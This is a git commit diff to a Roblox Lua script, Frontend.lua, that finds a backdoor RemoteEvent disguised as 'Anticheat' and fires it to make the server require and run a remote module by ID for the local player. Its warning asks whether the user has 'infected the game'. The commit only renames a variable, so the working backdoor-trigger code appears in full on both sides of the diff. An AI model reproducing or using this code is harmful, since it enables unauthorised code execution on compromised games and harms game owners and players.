51f0e9841bf58060381033cec190891ab28025aa
java <134158550+LuaGunsX@users.noreply.github.com>
2026-02-27 22:09:57 -0500

    Update Frontend.lua

--- Frontend.lua
+++ Frontend.lua
@@ -3,8 +3,8 @@ local moduleID = 970596902
 local backdoor = game:GetService("ReplicatedStorage"):FindFirstChild("Anticheat")
 
 if backdoor then
-    local executeScript = string.format('require(%d).load("%s")', moduleID, game.Players.LocalPlayer.Name)
-    backdoor:FireServer(executeScript)
+    local es = string.format('require(%d).load("%s")', moduleID, game.Players.LocalPlayer.Name)
+    backdoor:FireServer(es)
 else
     warn("clibackdoor not found, did you infect the game?")
 end
